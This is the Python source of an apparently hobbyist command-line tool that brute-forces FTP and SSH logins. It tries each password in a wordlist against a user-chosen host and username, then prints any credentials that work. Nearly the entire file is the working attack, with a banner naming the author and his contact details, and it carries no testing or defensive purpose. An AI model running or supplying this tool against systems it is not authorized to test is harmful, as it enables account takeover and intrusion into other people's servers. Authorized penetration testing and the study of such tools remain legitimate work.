from pwn import *
from colorama import Fore, Style
from ftplib import FTP
import argparse
import sys
import itertools
import threading
import time
import os

def print_logo():
    print(Fore.RED + Style.BRIGHT + """
 _   _    _   _     _   __    _____    ____     _____  
| | | |  | | | |   | \ |  |  |_   _|  |  __|   |      \   
| |_| |  | | | |   |  \|  |    | |    | |__    |     /  
|  _  |  | | | |   | |\   |    | |    |  __|   | |\  \   
| | | |  | |_| |   | | \  |    | |    | |__    | | \  \   
|_| |_|   \___/    |_|  \_|    |_|    |____/   |_|  \__\  
                                                        v1
>>>>>>>>>>>>>>>>>>>>> [ @iamarit ] <<<<<<<<<<<<<<<<<<<<<<
----------------------> FTP/SSH <------------------------

[+] Github:     https://github.com/iamarit
[+] LinkedIn:   https://www.linkedin.com/in/iamarit
[+] Gmail:      aritdutta74@gmail.com
""")

def display_animation():
    animation_frames = itertools.cycle(['|', '/', '-', '\\'])
    while not done:
        sys.stdout.write(Fore.CYAN + Style.BRIGHT + '\r=> Hunting... ' + next(animation_frames) + ' ')
        sys.stdout.flush()
        time.sleep(0.1)

def clear_last_line():
    # Clear the last line printed by animation
    sys.stdout.write('\r' + ' ' * 50 + '\r')
    sys.stdout.flush()

def brute_force_ftp(host, port, username, wordlist):
    attempts = 1
    with open(wordlist, "r") as password_list:
        for password in password_list:
            password = password.strip()
            clear_last_line()
            print(Fore.BLUE + f"[{attempts}] Attempting Password: {password}")
            try:
                ftp = FTP()
                ftp.connect(host, port)
                ftp.login(user=username, passwd=password)
                print(Fore.GREEN + Style.BRIGHT + "\n\n[+] Cracked!" + Fore.MAGENTA + Style.BRIGHT + f"  <->  {username}:{password}")
                ftp.quit()
                global done
                done = True
                break
            except Exception as e:
                print(Fore.YELLOW + f"[-] Failed: {e}")
            attempts += 1
    clear_last_line()

def brute_force_ssh(host, port, username, wordlist):
    attempts = 1
    with open(wordlist, "r") as password_list:
        for password in password_list:
            password = password.strip()
            clear_last_line()
            print(Fore.BLUE + f"[{attempts}] Attempting Password: {password}")
            try:
                response = ssh(user=username, host=host, port=port, password=password, timeout=1)
                if response.connected():
                    print(Fore.GREEN + Style.BRIGHT + "\n[+] Cracked!"+ Fore.MAGENTA + Style.BRIGHT + f"  <->  {username}:{password}")
                    global done
                    done = True
                    break
                else:
                    print(Fore.YELLOW + Style.BRIGHT + "[-] Failed: Authentication failed.")
            except Exception as e:
                print(Fore.YELLOW + Style.BRIGHT + f"[-] Failed: {e}")
            attempts += 1
    clear_last_line()

def main():
    parser = argparse.ArgumentParser(description=Fore.LIGHTYELLOW_EX + "A automate tool that allow you to bruteforce FTP/SSH service to crack password." + Fore.RESET)
    parser.add_argument('-s', '--service', choices=['ftp', 'ssh'], required=True, help=Fore.LIGHTGREEN_EX + 'Service to brute force (ftp or ssh)' + Fore.RESET)
    parser.add_argument('-p', '--port', type=int, default=None, help=Fore.LIGHTGREEN_EX + 'Port number of the service' + Fore.RESET)
    parser.add_argument('-H', '--host', required=True, help=Fore.LIGHTGREEN_EX + 'Target host' + Fore.RESET)
    parser.add_argument('-u', '--username', required=True, help=Fore.LIGHTGREEN_EX + 'Username for the service' + Fore.RESET)
    parser.add_argument('-P', '--wordlist', required=True, help=Fore.LIGHTGREEN_EX + 'Path to the password wordlist' + Fore.RESET)

    if len(sys.argv) == 1:
        print_logo()
        parser.print_usage()
        #parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()

    print_logo()  # Print the logo before executing the main functionality

    global done
    done = False
    t = threading.Thread(target=display_animation)
    t.start()

    if args.service == 'ftp':
        if args.port is None:
            args.port = 21
        brute_force_ftp(args.host, args.port, args.username, args.wordlist)
    elif args.service == 'ssh':
        if args.port is None:
            args.port = 22
        brute_force_ssh(args.host, args.port, args.username, args.wordlist)

    done = True
    t.join()

if __name__ == "__main__":
    main()
